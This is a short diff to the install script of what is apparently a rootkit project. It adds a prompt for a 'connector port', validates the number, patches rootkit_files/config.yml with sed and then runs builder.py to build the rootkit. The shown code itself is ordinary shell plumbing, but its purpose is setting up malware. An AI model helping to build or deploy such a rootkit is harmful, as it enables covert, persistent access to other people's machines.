@@ -11,7 +11,27 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-# Build rootkit first
+# Get port number from user input
+echo ""
+read -p "Enter the connector port number: " PORT_NUMBER
+if [ -z "$PORT_NUMBER" ]; then
+    echo "[-] Port number is required. Exiting."
+    exit 1
+fi
+
+# Validate port number
+if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
+    echo "[-] Invalid port number. Please enter a valid port (1-65535)."
+    exit 1
+fi
+
+echo "[+] Using port: $PORT_NUMBER"
+
+# Update config.yml with the new port number
+echo "[+] Updating configuration with port $PORT_NUMBER..."
+sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml
+
+# Build rootkit with updated configuration
 echo "[+] Building rootkit..."
 python3 builder.py -c rootkit_files/config.yml -o
 
